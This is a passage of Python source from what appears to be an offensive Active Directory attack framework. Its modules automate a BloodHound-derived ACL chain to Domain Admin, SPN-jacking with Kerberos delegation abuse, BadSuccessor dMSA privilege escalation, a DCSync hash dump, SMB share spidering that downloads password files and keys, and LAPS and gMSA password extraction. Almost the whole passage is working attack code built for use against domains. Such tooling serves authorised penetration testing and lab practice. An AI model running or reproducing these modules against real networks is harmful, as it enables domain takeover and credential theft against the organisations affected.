                rc  = _rcol(s['right'])
                frm = s['from'][:22]
                to  = s['to'][:22]

                # separator between hops (not before first)
                if i > 0:
                    _box_mid()

                # right name line
                _box_line(f'{GREY}{i+1:02d}  {rc}{s["right"]}{RESET}')
                # arrow line
                _box_line(f'    {WHITE}{frm:<24}{GREY}──────────────▶{RESET}  {WHITE}{to}{RESET}')
                # module line
                if s['module']:
                    _box_line(f'    {C0}→ run {s["module"]}{RESET}  {GREY}{s["action"]}{RESET}')

            _box_bot()
            print()

        steps = _fmt_steps(paths[0], sn, st)
        first = next((s for s in steps if s['module'] and s['right'] != 'MemberOf'), None)
        if first:
            log(f'Next step: {C0}run {first["module"]}{RESET}  {GREY}{first["action"]}{RESET}  {GREY}({first["from"]} → {first["to"]}){RESET}', 'info')
            go = self.ask('run it now?', 'n', ['y','n'])
            if go == 'y' and first['module'] in MODULES:
                MODULES[first['module']]().run(target)
        hr()


# =============================================================================
# PATHPWN — auto-execute BloodHound attack path
# =============================================================================
class PathPwn(Module):
    name='pathpwn'; description='auto-execute BloodHound attack path — chains modules from pathfind output to DA'; category='exploitation'
    def run(self, target):
        hr()
        log(f'{C0}{BOLD}PathPwn — automated ACL chain execution{RESET}','info')
        log(f'{GREY}Reads BloodHound data, finds shortest path to DA, runs each step{RESET}','info')

        data, adj, sn, st, hv, dom_sid = get_bh_data(target.loot_dir)
        if not data['users']:
            log(f'No BloodHound JSON found — run {C0}adrecon{RESET} first','error'); hr(); return



        owned = self.ask('start user', target.user or '')
        if not owned: hr(); return

        def _match_user(u, q):
            q = q.upper()
            name = u['Properties'].get('name','').upper()
            sam  = u['Properties'].get('samaccountname', u['Properties'].get('SamAccountName','')).upper()
            return (name == q or name.split('@')[0] == q or sam == q or sam.split('@')[0] == q)

        owned_sid = next((u['ObjectIdentifier'] for u in data['users'] if _match_user(u, owned)), None)
        if not owned_sid:
            log(f'User {WHITE}{owned}{RESET} not found in BloodHound data','error'); hr(); return

        starts = {owned_sid}
        for r, t in adj[owned_sid]:
            if r == 'MemberOf': starts.add(t)

        paths = _dijkstra_paths(starts, adj, hv, sn, st)
        if not paths:
            log('No paths to DA found — run pathfind to see available edges','warn'); hr(); return

        # Dijkstra already returns paths sorted by weight (best first)
        path = paths[0]
        log(f'{GREEN}{len(paths)} path(s) found — shortest has {len(path)-1} steps{RESET}','success')
        print()

        # path format: [(sid, right, prev_sid), ...] where first entry has right=None
        steps = []
        for node, right, prev in path:
            if right is None: continue  # skip start node
            src_sid  = prev
            dst_sid  = node
            edge     = right
            _sn_src  = sn.get(src_sid, src_sid)
            _sn_dst  = sn.get(dst_sid, dst_sid)
            src_name = (str(_sn_src[0]) if isinstance(_sn_src, tuple) else str(_sn_src)).split('@')[0]
            dst_name = (str(_sn_dst[0]) if isinstance(_sn_dst, tuple) else str(_sn_dst)).split('@')[0]
            mod, action, desc = ACE_TO_MODULE.get(str(edge), ('','',''))
            steps.append({'edge':str(edge),'src':src_name,'dst':dst_name,
                          'src_sid':src_sid,'dst_sid':dst_sid,
                          'module':mod,'action':action,'desc':desc})

        # show plan
        print(f'  {C0}{BOLD}attack plan:{RESET}\n')
        for idx, s in enumerate(steps):
            col = RED    if s['edge'] in ('GenericAll','WriteDacl','WriteOwner','Owns') else \
                  ORANGE if s['edge'] in ('ForceChangePassword','AddMember','AddSelf','GenericWrite','AllExtendedRights') else \
                  PINK   if s['edge'] in ('GetChangesAll','GetChanges','DCSync') else \
                  GREEN  if s['edge'] in ('AdminTo','CanPSRemote') else C0
            mod_str = f'{C0}→ {s["module"]}{RESET}' if s['module'] else f'{GREY}manual{RESET}'
            src = str(s["src"]); dst = str(s["dst"]); edge = str(s["edge"])
            print(f'  {GREY}{idx+1:02d}{RESET}  {WHITE}{src:<20}{RESET} {col}{edge:<22}{RESET} {WHITE}{dst:<20}{RESET}  {mod_str}')
        print()

        confirm = self.ask(f'execute {len(steps)} steps','y',['y','n'])
        if confirm != 'y': hr(); return

        for idx, s in enumerate(steps):
            hr()
            log(f'{GREY}step {idx+1}/{len(steps)}{RESET}  {WHITE}{str(s["src"])}{RESET} {C0}─[{str(s["edge"])}]→{RESET} {WHITE}{str(s["dst"])}{RESET}','info')
            if s['desc']: log(f'{GREY}{s["desc"]}{RESET}','info')

            if s['edge'] == 'MemberOf':
                log(f'{GREY}MemberOf — group membership already effective, skipping{RESET}','info')
                continue

            if not s['module']:
                log(f'No automated module for {WHITE}{s["edge"]}{RESET} — manual action required','warn')
                input(f'  Complete manually then press Enter to continue...')
                continue

            mod = MODULES.get(s['module'])
            if not mod:
                log(f'Module {s["module"]} not available','warn')
                input(f'  Press Enter to continue...')
                continue

            try:
                log(f'{PINK}→ running {s["module"]}{RESET}','info')

                # ── smart pathpwn context injection ──────────────────────────
                # store hints in a global that bloody/dcsync modules can read
                edge     = s['edge']
                dst      = s['dst']
                src      = s['src']
                _dst_up  = dst.upper()
                _is_dom  = any(x in _dst_up for x in ('DOMAIN','HTB.LOCAL','LOCAL','DC='))
                _is_grp  = not any(x in _dst_up for x in ('$',))
                _usr     = target.user or src

                if s['module'] == 'bloody':
                    if edge == 'WriteDacl' and _is_dom:
                        log(f'{C0}auto: WriteDacl on Domain → dcsync-rights{RESET}','info')
                        _PATHPWN_HINTS['action'] = 'dcsync-rights'
                    elif edge in ('GenericAll','WriteOwner','Owns') and _is_dom:
                        log(f'{C0}auto: {edge} on Domain → dcsync-rights{RESET}','info')
                        _PATHPWN_HINTS['action'] = 'dcsync-rights'
                    elif edge in ('GenericAll','WriteDacl','AddMember','AddSelf') and _is_grp:
                        log(f'{C0}auto: {edge} on group {dst} → addtogroup {_usr}{RESET}','info')
                        _PATHPWN_HINTS['action'] = 'addtogroup'
                        _PATHPWN_HINTS['group']  = dst
                        _PATHPWN_HINTS['user']   = _usr
                    elif edge == 'ForceChangePassword':
                        log(f'{C0}auto: ForceChangePassword → resetpwd on {dst}{RESET}','info')
                        _PATHPWN_HINTS['action'] = 'resetpwd'
                        _PATHPWN_HINTS['user']   = dst
                    else:
                        log(f'{GREY}Target: {WHITE}{dst}{RESET}  Edge: {C0}{edge}{RESET}','info')
                elif s['module'] == 'dcsync':
                    log(f'{GREY}DCSync — dumping all domain hashes{RESET}','info')
                    _PATHPWN_HINTS['user'] = ''  # dump all

                mod().run(target)
                _PATHPWN_HINTS.clear()
                add_result('pathpwn', f'{s["edge"]}: {s["src"]} → {s["dst"]}')
            except (EOFError, KeyboardInterrupt):
                log('Step cancelled','warn')
                if self.ask('continue to next step','y',['y','n']) != 'y': break
            except Exception as exc:
                log(f'Step error: {exc}','error')
                if self.ask('continue anyway','y',['y','n']) != 'y': break

        hr()
        log(f'{GREEN}PathPwn complete{RESET}','success')
        add_result('pathpwn', f'chain: {len(steps)} steps → DA')
        hr()


# =============================================================================
# SPN-JACKING
# =============================================================================
class SPNJack(Module):
    name='spnjack'; description='SPN-Jacking -- Ghost / Live / HOST service class SPN hijack via constrained delegation'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'Requires {WHITE}WriteSPN{RESET} on target computer and a server configured for {WHITE}Constrained Delegation{RESET}', 'info')
        jtype = self.ask('type','ghost',['ghost','live','host'])
        hr()

        getST  = check_tool('impacket-getST','getST.py')
        tgssub = check_tool('tgssub.py','impacket-tgssub')
        bloody = check_tool('bloodyad','bloodyAD')
        if not getST: log('impacket-getST not found', 'error'); return

        server_a  = self.ask('delegating server (ServerA$) — has constrained delegation')
        server_a_pass = self.ask('ServerA$ password or hash')
        target_spn = self.ask('target SPN (e.g. cifs/serverB)')
        server_c  = self.ask('your controlled machine (ServerC$)')
        impersonate = self.ask('user to impersonate', 'administrator')
        out_ccache  = os.path.join(target.loot_dir, f'spnjack_{impersonate}.ccache')
        alt_spn     = self.ask('altservice SPN on ServerC (e.g. cifs/serverC)', f'cifs/{server_c.rstrip("$").lower()}')

        base_bloody = [bloody,'--host',target.dc,'-d',target.domain,'-u',target.user]
        if target.password: base_bloody += ['-p',target.password]
        elif target.hash:   base_bloody += ['-p',f':{target.hash}']

        if jtype == 'ghost':
            log(f'{C0}Ghost SPN-Jacking{RESET} — orphaned SPN claimed on ServerC', 'info')
            log(f'Verify {WHITE}{target_spn}{RESET} has no active account first', 'warn')
            # add orphaned SPN to ServerC
            if bloody:
                run_cmd(base_bloody+['set','object',f'CN={server_c.rstrip("$")},CN=Computers,DC='+target.domain.replace(".",",DC="),
                        'servicePrincipalName','-v',target_spn], label='bloodyAD add ghost SPN to ServerC')

        elif jtype == 'live':
            log(f'{C0}Live SPN-Jacking{RESET} — remove from ServerB, add to ServerC, restore after', 'info')
            server_b = self.ask('ServerB (current SPN owner)')
            log(f'{ORANGE}Step 1: Removing {target_spn} from {server_b}{RESET}', 'warn')
            if bloody:
                run_cmd(base_bloody+['remove','spn',server_b,target_spn], label='bloodyAD remove SPN from ServerB')
            log(f'Step 2: Adding {target_spn} to {server_c}', 'info')
            if bloody:
                run_cmd(base_bloody+['add','spn',server_c,target_spn], label='bloodyAD add SPN to ServerC')

        elif jtype == 'host':
            log(f'{C0}HOST SPN-Jacking{RESET} — remove HOST SPNs, add explicit SPN, restore HOST', 'info')
            server_b = self.ask('ServerB (HOST SPN owner)')
            log(f'{ORANGE}Step 1: Removing HOST SPNs from {server_b}{RESET}', 'warn')
            host_spns = [f'HOST/{server_b}', f'HOST/{server_b}.{target.domain}',
                         f'RestrictedKrbHost/{server_b}', f'RestrictedKrbHost/{server_b}.{target.domain}']
            if bloody:
                for spn in host_spns:
                    run_cmd(base_bloody+['remove','spn',server_b,spn], label=f'remove {spn}')
            log(f'Step 2: Adding explicit {target_spn} to {server_c}', 'info')
            if bloody:
                run_cmd(base_bloody+['add','spn',server_c,target_spn], label='add SPN to ServerC')
            log(f'Step 3: Restoring HOST SPNs to {server_b} (DC allows this)', 'info')
            if bloody:
                run_cmd(base_bloody+['add','spn',server_b,f'HOST/{server_b}'], label='restore HOST SPN')

        # S4U2self + S4U2proxy
        hr()
        log(f'Running S4U2self + S4U2proxy — impersonating {WHITE}{impersonate}{RESET}', 'info')
        auth_str = f'{target.domain}/{server_a}:{server_a_pass}'
        cmd = [getST,'-spn',target_spn,'-impersonate',impersonate,
               '-altservice',alt_spn,'-dc-ip',target.dc,auth_str]
        env = os.environ.copy(); env['KRB5CCNAME'] = out_ccache
        run_cmd(cmd, label='getST S4U2proxy')

        if os.path.exists(out_ccache):
            log(f'Ticket saved: {WHITE}{out_ccache}{RESET}', 'success')
            log(f'Use: {WHITE}export KRB5CCNAME={out_ccache}{RESET}', 'info')
            log(f'Then: {WHITE}impacket-smbclient -k {target.domain}/{impersonate}@{server_c}.{target.domain}{RESET}', 'info')

        # rollback for live/host
        if jtype in ('live','host') and bloody:
            hr()
            rollback = self.ask('rollback SPNs now?','y',['y','n'])
            if rollback == 'y':
                if jtype == 'live':
                    run_cmd(base_bloody+['remove','spn',server_c,target_spn], label='rollback: remove from ServerC')
                    run_cmd(base_bloody+['add','spn',server_b,target_spn], label='rollback: restore to ServerB')
                elif jtype == 'host':
                    run_cmd(base_bloody+['remove','spn',server_c,target_spn], label='rollback: remove from ServerC')
        hr()


# =============================================================================
# BAD-SUCCESSOR
# =============================================================================
class BadSuccessor(Module):
    name='badsuccessor'; description='BadSuccessor (CVE-2025-???) -- dMSA privilege escalation via msDS-ManagedAccountPrecededByLink (Win Server 2025)'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{ORANGE}BadSuccessor targets Windows Server 2025 dMSA migration{RESET}', 'warn')
        log(f'Requires {WHITE}CreateChild{RESET} on an OU or {WHITE}GenericWrite{RESET} on a dMSA object', 'info')

        # check DC OS version
        try:
            out = subprocess.check_output(['python3','-c',
                f'import ldap3; s=ldap3.Server("{target.dc}"); c=ldap3.Connection(s); c.bind(); ' +
                'print(c.server.info.other["operatingSystem"][0] if c.server.info else "")'],
                stderr=subprocess.DEVNULL, text=True, timeout=5).strip()
            if out and '2025' not in out:
                log(f'DC OS: {WHITE}{out}{RESET} — BadSuccessor requires Windows Server 2025', 'warn')
                proceed = self.ask('proceed anyway?','n',['y','n'])
                if proceed != 'y': hr(); return
            elif out:
                log(f'DC OS: {GREEN}{out}{RESET} — Windows Server 2025 confirmed', 'success')
        except Exception: pass

        bloody = check_tool('bloodyad','bloodyAD')
        getTGT = check_tool('impacket-getTGT','getTGT.py')
        if not bloody: log('bloodyAD not found', 'error'); return

        base = [bloody,'--host',target.dc,'-d',target.domain,'-u',target.user]
        if target.password: base += ['-p',target.password]
        elif target.hash:   base += ['-p',f':{target.hash}']

        hr()
        technique = self.ask('technique','full',['technique1','technique2','full'])

        dmsa_name   = self.ask('dMSA account name (existing or to create)')
        dmsa_dn     = self.ask('dMSA DN', f'CN={dmsa_name},CN=Managed Service Accounts,DC='+target.domain.replace(".",",DC="))
        priv_user   = self.ask('privileged account to inherit from','Administrator')
        priv_dn     = self.ask('privileged account DN', f'CN={priv_user},CN=Users,DC='+target.domain.replace(".",",DC="))
        ou_dn       = self.ask('OU you control (for fake account)', f'CN=Users,DC='+target.domain.replace(".",",DC="))
        hr()

        if technique in ('technique1','full'):
            log(f'{C0}Technique 1{RESET} — gain authorized access to dMSA via fake superseded account', 'info')
            fake_user = self.ask('fake account sAMAccountName', 'fakesvc')
            fake_pass = self.ask('fake account password', 'Passw0rd123!')
            fake_dn   = f'CN={fake_user},{ou_dn}'

            # create fake account
            run_cmd(base+['add','user',fake_user,fake_pass], label='create fake superseded account')

            # initiate migration: fake → dMSA  (sets msDS-ManagedAccountPrecededByLink)
            log(f'Initiating dMSA migration from fake account → {dmsa_name}', 'info')
            run_cmd(base+['set','object',dmsa_dn,
                    'msDS-ManagedAccountPrecededByLink','-v',fake_dn,
                    'msDS-DelegatedMSAState','-v','1'],
                    label='set migration attributes')

            # AD auto-grants fake account write on msDS-GroupMSAMembership
            # use fake account to add our user to authorized list
            log(f'Using fake account to add {WHITE}{target.user}{RESET} to dMSA authorized users', 'info')
            our_dn = self.ask('your account DN (to authorize on dMSA)',
                              f'CN={target.user},CN=Users,DC='+target.domain.replace(".",",DC="))
            run_cmd([bloody,'--host',target.dc,'-d',target.domain,
                     '-u',fake_user,'-p',fake_pass,
                     'set','object',dmsa_dn,'msDS-GroupMSAMembership','-v',our_dn],
                    label='add self to dMSA authorized users')
            log(f'{GREEN}Technique 1 complete — you are now authorized to use {dmsa_name}{RESET}', 'success')

        if technique in ('technique2','full'):
            log(f'{C0}Technique 2{RESET} — make dMSA inherit Domain Admin privileges', 'info')
            log(f'Setting msDS-ManagedAccountPrecededByLink → {WHITE}{priv_dn}{RESET}', 'info')

            run_cmd(base+['set','object',dmsa_dn,
                    'msDS-ManagedAccountPrecededByLink','-v',priv_dn],
                    label='set PrecededByLink to privileged account')

            run_cmd(base+['set','object',dmsa_dn,
                    'msDS-DelegatedMSAState','-v','2'],
                    label='set migration state = completed')

            log(f'{GREEN}Technique 2 complete — dMSA now inherits {priv_user} privileges{RESET}', 'success')
            log(f'Now authenticate as the dMSA to get a DA PAC', 'info')

            if getTGT:
                log(f'Getting TGT as dMSA ({dmsa_name})...', 'info')
                out_ccache = os.path.join(target.loot_dir, f'badsuccessor_{dmsa_name}.ccache')
                run_cmd([getTGT,f'{target.domain}/{dmsa_name}$','-dc-ip',target.dc,'-o',out_ccache],
                        label='getTGT as dMSA')
                if os.path.exists(out_ccache):
                    log(f'TGT saved: {WHITE}{out_ccache}{RESET}', 'success')
                    log(f'Export: {WHITE}export KRB5CCNAME={out_ccache}{RESET}', 'info')
                    log(f'DCSync: {WHITE}impacket-secretsdump -k -no-pass {target.domain}/{dmsa_name}$@{target.dc}{RESET}', 'info')
        hr()


# =============================================================================
# SHARES — spider SMB shares for sensitive files
# =============================================================================
class ShareSpider(Module):
    name='shares'; description='spider SMB shares -- hunt passwords, configs, keys, scripts'; category='recon'
    def run(self, target):
        if not self.req(target): return
        nxc = self.need('netexec','nxc','crackmapexec','cme')
        if not nxc: return
        hr()
        mode = self.ask('mode','list',['list','spider','get','auto'])
        # Kerberos requires FQDN not IP
        ccache = os.environ.get('KRB5CCNAME','')
        use_krb = ccache and os.path.exists(ccache)
        default_host = target.dc_fqdn or target.dc
        t_host = self.ask('target', default_host)
        if use_krb and t_host == target.dc and target.dc_fqdn:
            t_host = target.dc_fqdn
            log(f'{ORANGE}Kerberos active — using FQDN: {WHITE}{t_host}{RESET}','info')
        hr()

        # build auth args — must NOT include host (already in cmd as smb target)
        if use_krb:
            nxc_auth = ['-k','--use-kcache','-u',target.user or '']
        elif target.user and (target.password or target.hash):
            nxc_auth = ['-u',target.user,'-d',target.domain or 'WORKGROUP']
            if target.hash:       nxc_auth += ['-H',target.hash]
            elif target.password: nxc_auth += ['-p',target.password]
        else:
            # try null session first, fall back to guest automatically
            nxc_auth = ['-u','','-p','']
            _null_test = run_cmd_capture([nxc,'smb',t_host,'-u','','-p','','--shares'],
                                         label='null session test')[1]
            if any('ACCESS_DENIED' in l or 'SESSION_DELETED' in l for l in _null_test):
                log(f'{ORANGE}Null session denied — using guest{RESET}','warn')
                nxc_auth = ['-u','guest','-p','']

        # interesting file extensions and patterns
        INTERESTING_EXT = {'.xlsx','.xls','.xlsm','.docx','.doc','.kdbx','.kdb',
                           '.pfx','.p12','.pem','.key','.ppk','.rdp','.ovpn',
                           '.config','.conf','.cfg','.ini','.env','.xml','.yaml','.yml',
                           '.ps1','.bat','.cmd','.sh','.txt','.log','.bak','.old','.zip'}
        INTERESTING_NAMES = {'password','passwd','cred','secret','backup','id_rsa',
                             'id_ed25519','authorized_keys','web.config','wp-config',
                             'appsettings','database','connection','ntds','shadow'}
        FLAG_EMOJI = {'.kdbx':'🔑 KeePass DB','.kdb':'🔑 KeePass DB',
                      '.pfx':'🔑 Certificate','.p12':'🔑 Certificate',
                      '.ppk':'🔑 PuTTY key','.rdp':'🖥  RDP file',
                      '.ovpn':'🔒 VPN config','.xlsx':'📊 Spreadsheet',
                      '.xlsm':'📊 Spreadsheet (macros)'}

        def _flag_file(fname, fpath=''):
            ext  = os.path.splitext(fname.lower())[1]
            base = os.path.splitext(fname.lower())[0]
            label = FLAG_EMOJI.get(ext,'')
            if any(kw in base for kw in INTERESTING_NAMES): label = label or '⚠ interesting'
            return label

        def _auto_download(share, remote_path, local_dir):
            fname = os.path.basename(remote_path)
            ext   = os.path.splitext(fname.lower())[1]
            base  = os.path.splitext(fname.lower())[0]
            if ext not in INTERESTING_EXT and not any(kw in base for kw in INTERESTING_NAMES):
                return False
            local = os.path.join(local_dir, fname)
            r = subprocess.run(
                [nxc,'smb',t_host]+nxc_auth+
                ['--get-file',remote_path,local,'--share',share],
                capture_output=True, text=True, errors='replace')
            if os.path.exists(local):
                flag = _flag_file(fname)
                log(f'{GREEN}Downloaded: {WHITE}{fname}{RESET}  {PINK}{flag}{RESET}','success')
                add_result('shares', f'{flag or "file"}: {fname}')
                return True
            return False

        if mode == 'list':
            rc, lines = run_cmd_capture([nxc,'smb',t_host]+nxc_auth+['--shares'], label='netexec shares')
            # fallback to guest if null session denied
            if rc != 0 or all('ACCESS_DENIED' in l or 'SESSION_DELETED' in l for l in lines if 'Error' in l):
                denied = any('ACCESS_DENIED' in l or 'SESSION_DELETED' in l for l in lines)
                if denied and not target.user:
                    log(f'{ORANGE}Null session denied — retrying with guest{RESET}','warn')
                    run_cmd([nxc,'smb',t_host,'-u','guest','-p','','--shares'], label='netexec shares (guest)')

        elif mode == 'spider':
            share   = self.ask('share to spider','')
            pattern = self.ask('pattern (regex)',
                r'password|passwd|cred|secret|key|config|\.xml|\.ini|\.cfg|\.txt|\.exe|\.ps1|\.kdbx|\.xlsx')
            cmd = [nxc,'smb',t_host]+nxc_auth
            if share: cmd += ['--spider',share]
            else:     cmd += ['--spider','']
            cmd += ['--pattern',pattern,'--depth','5']
            run_cmd(cmd, label='netexec spider')

        elif mode == 'get':
            share = self.ask('share'); path = self.ask('remote path')
            out   = os.path.join(target.loot_dir, os.path.basename(path))
            run_cmd([nxc,'smb',t_host]+nxc_auth+
                    ['--get-file',path,out,'--share',share],
                    label='netexec get file')
            if os.path.exists(out):
                flag = _flag_file(os.path.basename(path))
                log(f'Saved: {WHITE}{out}{RESET}  {PINK}{flag}{RESET}','success')
                if flag: add_result('shares', f'{flag}: {os.path.basename(path)}')

        elif mode == 'auto':
            log('AUTO mode — spider all shares and download interesting files','info')
            log(f'{ORANGE}This may take a while on large environments{RESET}','warn')
            os.makedirs(target.loot_dir, exist_ok=True)

            # 1. list shares
            log('Step 1: listing shares...','info')
            rc, share_lines = run_cmd_capture([nxc,'smb',t_host]+nxc_auth+['--shares'],
                                              label='list shares')
            shares = []
            for l in share_lines:
                if 'READ' in l or 'WRITE' in l:
                    parts = l.split()
                    for i,p in enumerate(parts):
                        if p in ('READ','WRITE','READ,WRITE') and i > 0:
                            sname = parts[i-1].strip()
                            if sname and sname not in ('ADMIN$','IPC$','print$'):
                                shares.append(sname)
            shares = list(dict.fromkeys(shares))

            # fallback 1: guest account if null session failed
            if not shares and nxc_auth == ['-u','','-p','']:
                log(f'{ORANGE}Null session denied — trying guest account{RESET}','warn')
                guest_auth = ['-u','guest','-p','']
                rc, share_lines = run_cmd_capture([nxc,'smb',t_host]+guest_auth+['--shares'],
                                                  label='list shares (guest)')
                for l in share_lines:
                    if 'READ' in l or 'WRITE' in l:
                        parts = l.split()
                        for i,p in enumerate(parts):
                            if p in ('READ','WRITE','READ,WRITE') and i > 0:
                                sname = parts[i-1].strip()
                                if sname and sname not in ('ADMIN$','IPC$','print$'):
                                    shares.append(sname)
                shares = list(dict.fromkeys(shares))
                if shares:
                    nxc_auth = guest_auth  # use guest for subsequent operations
                    log(f'{GREEN}Guest session works{RESET}','success')

            if not shares:
                log('No readable shares found — try setting valid credentials','warn'); hr(); return
            share_list = ', '.join(shares)
            log(f'{GREEN}{len(shares)} readable share(s): {WHITE}{share_list}{RESET}','success')

            # 2. use smbclient recursive listing to find all files
            smbcl = check_tool('smbclient')
            downloaded = 0
            for share in shares:
                log(f'Spidering {WHITE}{share}{RESET}...','info')
                file_paths = []

                if smbcl:
                    # build smbclient auth
                    if target.hash:
                        smb_auth_args = [f'//{t_host}/{share}','-U',
                            f'{target.domain}/{target.user}%{target.hash}','--pw-nt-hash','-c','recurse;ls']
                    elif target.user and target.password:
                        smb_auth_args = [f'//{t_host}/{share}','-U',
                            f'{target.domain}/{target.user}%{target.password}','-c','recurse;ls']
                    else:
                        smb_auth_args = [f'//{t_host}/{share}','-U','guest%','-c','recurse;ls']
                    rc2, smb_lines = run_cmd_capture([smbcl]+smb_auth_args, label=f'smbclient ls {share}')

                    # parse smbclient recursive output
                    current_dir = '\\'
                    for l in smb_lines:
                        # directory change: \subdir\
                        dm = re.match(r'\s*\\(.*)\\\s*$', l)
                        if dm:
                            current_dir = '\\' + dm.group(1).rstrip('\\') + '\\'
                            continue
                        # file entry: filename  A  size  date
                        fm = re.match(r'\s+(.+?)\s+[A-Z]+\s+(\d+)\s+', l)
                        if fm:
                            fname = fm.group(1).strip()
                            if fname in ('.','..') or fname.startswith('.'):
                                continue
                            full_path = current_dir + fname
                            file_paths.append(full_path)
                else:
                    # fallback: nxc spider with content flag
                    rc2, file_lines = run_cmd_capture(
                        [nxc,'smb',t_host]+nxc_auth+
                        ['--spider',share,'--depth','6','--pattern',r'.+','--content'],
                        label=f'spider {share}')
                    for l in file_lines:
                        m = re.search(r'(?:\\\\|//)[^\s]+', l)
                        if m:
                            fpath = m.group(0).replace('\\\\','/').replace('//','/').lstrip('/')
                            parts = fpath.split('/',1)
                            rel = parts[1] if len(parts) > 1 else parts[0]
                            file_paths.append('\\' + rel.replace('/','\\'))

                # download interesting files
                for fpath in file_paths:
                    if _auto_download(share, fpath, target.loot_dir):
                        downloaded += 1

            log(f'{GREEN}{downloaded} interesting file(s) downloaded to {WHITE}{target.loot_dir}{RESET}','success')
            if downloaded:
                add_result('shares', f'{downloaded} files auto-downloaded')
        hr()


# =============================================================================
# LAPS — read LAPS passwords
# =============================================================================
class LAPS(Module):
    name='laps'; description='read LAPS passwords -- ms-MCS-AdmPwd via LDAP / netexec'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        hr()
        mode = self.ask('mode','all',['all','computer','netexec'])
        hr()
        if mode in ('all','computer'):
            nxc = check_tool('netexec','nxc','crackmapexec','cme')
            if nxc:
                comp = '' if mode == 'all' else self.ask('computer name')
                cmd  = [nxc,'ldap',target.dc]+target.nxc_args()+['--laps']
                if comp: cmd += ['--computer',comp]
                run_cmd(cmd, label='netexec laps')
            # also try bloodyAD
            bloody = check_tool('bloodyad','bloodyAD')
            if bloody:
                base = [bloody,'--host',target.dc,'-d',target.domain,'-u',target.user]
                if target.password: base += ['-p',target.password]
                elif target.hash:   base += ['-p',f':{target.hash}']
                run_cmd(base+['get','search','--filter','(ms-MCS-AdmPwd=*)','--attr','ms-MCS-AdmPwd,sAMAccountName'],
                        label='bloodyAD laps')
        elif mode == 'netexec':
            nxc = self.need('netexec','nxc')
            if not nxc: return
            run_cmd([nxc,'smb',target.dc]+target.nxc_args()+['--laps'],
                    label='netexec smb laps')
        hr()


# =============================================================================
# GMSA — read gMSA passwords
# =============================================================================
class GMSA(Module):
    name='gmsa'; description='read gMSA passwords -- netexec / bloodyAD / gMSADumper / DSInternals KDS derivation'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        hr()
        nxc    = check_tool('netexec','nxc','crackmapexec','cme')
        bloody = check_tool('bloodyad','bloodyAD')
        dumper = check_tool('gMSADumper.py','gmsadumper')
        ccache = os.environ.get('KRB5CCNAME','')
        use_krb = bool(ccache and os.path.exists(ccache))
        dc     = target.dc_fqdn or target.dc
        found  = False

        # ── netexec ────────────────────────────────────────────────────────
        if nxc:
            log('Trying netexec ldap --gmsa...','info')
            base = [nxc,'ldap',target.dc,dc]
            if use_krb: base = [nxc,'ldap',dc,'-k','--use-kcache','-u',target.user]
            else:        base = [nxc,'ldap',target.dc]+target.nxc_args()
            rc, lines = run_cmd_capture(base+['--gmsa'], label='netexec gmsa')
            hits = [l for l in lines if 'NTLM:' in l and '<no read' not in l]
            if hits:
                for h in hits:
                    m = re.search(r'Account:\s*(\S+)\s+NTLM:\s*([a-f0-9]{32})', h, re.I)
                    if m:
                        acct, ntlm = m.group(1), m.group(2)
                        log(f'{GREEN}gMSA: {WHITE}{acct}{GREEN} → NTLM: {WHITE}{ntlm}{RESET}','success')
                        ws = os.path.basename(target.loot_dir)
                        _db_save_cred(ws, target.domain, acct, hash_val=ntlm, source='gmsa')
                        add_result('gmsa', f'{acct} NTLM: {ntlm[:16]}...')
                        found = True

        # ── bloodyAD ───────────────────────────────────────────────────────
        if bloody and not found:
            log('Trying bloodyAD...','info')
            base = [bloody,'--host',dc,'-d',target.domain,'-u',target.user]
            if use_krb: base += ['-k']
            elif target.password: base += ['-p',target.password]
            elif target.hash:     base += ['-p',f':{target.hash}']
            rc, lines = run_cmd_capture(
                base+['get','search','--filter','(objectClass=msDS-GroupManagedServiceAccount)',
                      '--attr','sAMAccountName,msDS-ManagedPassword'],
                label='bloodyAD gmsa')
            if any('msDS-ManagedPassword' in l for l in lines):
                found = True

        # ── gMSADumper ────────────────────────────────────────────────────
        if dumper and not found:
            log('Trying gMSADumper...','info')
            run_cmd([dumper,'-u',target.user,'-p',target.password or '',
                     '-l',target.dc,'-d',target.domain], label='gMSADumper')

        # ── ldeep AES256 ──────────────────────────────────────────────────
        ldeep = check_tool('ldeep')
        if ldeep and not found:
            log('Trying ldeep (AES256 — for RC4-disabled envs)...','info')
            krb_host = target.dc_fqdn if target.dc_fqdn else f'dc01.{target.domain}'
            if use_krb:
                run_cmd([ldeep,'ldap','-u',target.user,'-k','-d',target.domain,
                         '-s',f'ldap://{krb_host}','gmsa'], label='ldeep gmsa AES256')
            elif target.password:
                run_cmd([ldeep,'ldap','-u',target.user,'-p',target.password,
                         '-d',target.domain,'-s',f'ldap://{target.dc}','gmsa'],
                        label='ldeep gmsa AES256')

        # ── DSInternals fallback — KDS root key derivation ────────────────
        if not found:
            log(f'{ORANGE}Standard tools failed — trying DSInternals KDS key derivation{RESET}','warn')
            dsinternals = check_tool('Get-GMSAPassword','DSInternals')
            if dsinternals:
                # PowerShell DSInternals
                ps_cmd = (f"Import-Module DSInternals; "
                          f"$cred = New-Object PSCredential('{target.domain}\\{target.user}',"
                          f"(ConvertTo-SecureString '{target.password or ''}' -AsPlainText -Force)); "
                          f"Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword | "
                          f"ConvertFrom-ADManagedPasswordBlob | Select-Object Account,CurrentPassword")
                run_cmd(['powershell','-c',ps_cmd], label='DSInternals gMSA')
            else:
                # Pure Python fallback using impacket LDAP + manual blob parsing
                log('DSInternals not found — attempting manual blob parsing via impacket LDAP','info')
                try:
                    import struct as _struct
                    # fetch raw msDS-ManagedPassword blob via ldap3
                    ldap3 = __import__('ldap3')
                    server = ldap3.Server(target.dc, get_info=ldap3.ALL)
                    if use_krb:
                        conn = ldap3.Connection(server, authentication=ldap3.SASL,
                                                sasl_mechanism=ldap3.KERBEROS)
                    elif target.password:
                        conn = ldap3.Connection(server,
                                                user=f'{target.domain}\\{target.user}',
                                                password=target.password)
                    elif target.hash:
                        conn = ldap3.Connection(server,
                                                user=f'{target.domain}\\{target.user}',
                                                password=f':{target.hash}',
                                                authentication=ldap3.NTLM)
                    else:
                        raise ValueError('No credentials available')

                    conn.bind()
                    base_dn = ','.join(f'DC={p}' for p in target.domain.split('.'))
                    conn.search(base_dn,
                                '(objectClass=msDS-GroupManagedServiceAccount)',
                                attributes=['sAMAccountName','msDS-ManagedPassword'])
                    for entry in conn.entries:
